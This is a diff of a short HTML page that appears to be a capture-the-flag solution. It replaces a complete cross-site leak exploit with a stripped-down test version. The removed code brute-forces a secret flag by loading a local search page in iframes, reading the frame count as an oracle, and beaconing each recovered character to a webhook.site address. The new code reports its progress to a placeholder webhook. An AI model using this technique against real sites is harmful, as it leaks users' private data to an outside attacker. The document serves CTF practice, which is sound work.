@@ -1,47 +1,20 @@
 <html>
 <body>
 <script>
-const WEBHOOK = "https://webhook.site/8088a9e6-c7fe-4518-ad97-fa0c73431f5f";
-const CHARSET = "0123456789abcdef";
-let known = "DH{";
+// 1단계: 페이지 로드 확인
+fetch("https://webhook.site/YOUR_WEBHOOK_B_URL?step=loaded");
 
-function check(guess) {
-  return new Promise((resolve) => {
-    const iframe = document.createElement("iframe");
-    iframe.src = `http://127.0.0.1:8000/search?query=${encodeURIComponent(guess)}`;
-    iframe.onload = () => {
-      setTimeout(() => {
-        try {
-          const found = iframe.contentWindow.length > 0;
-          document.body.removeChild(iframe);
-          resolve(found);
-        } catch(e) {
-          document.body.removeChild(iframe);
-          resolve(false);
-        }
-      }, 100);
-    };
-    document.body.appendChild(iframe);
-  });
-}
-
-async function solve() {
-  for (let i = 0; i < 32; i++) {
-    for (const c of CHARSET) {
-      const guess = known + c;
-      const hit = await check(guess);
-      if (hit) {
-        known += c;
-        navigator.sendBeacon(`${WEBHOOK}?flag=${encodeURIComponent(known)}`);
-        break;
-      }
-    }
-  }
-  known += "}";
-  navigator.sendBeacon(`${WEBHOOK}?flag=${encodeURIComponent(known)}`);
-}
-
-solve();
+// 2단계: iframe 테스트
+const iframe = document.createElement("iframe");
+iframe.src = "http://127.0.0.1:8000/search?query=DH{";
+iframe.onload = () => {
+  const len = iframe.contentWindow.length;
+  fetch("https://webhook.site/YOUR_WEBHOOK_B_URL?step=iframe_loaded&len=" + len);
+};
+iframe.onerror = () => {
+  fetch("https://webhook.site/YOUR_WEBHOOK_B_URL?step=iframe_error");
+};
+document.body.appendChild(iframe);
 </script>
 </body>
 </html>
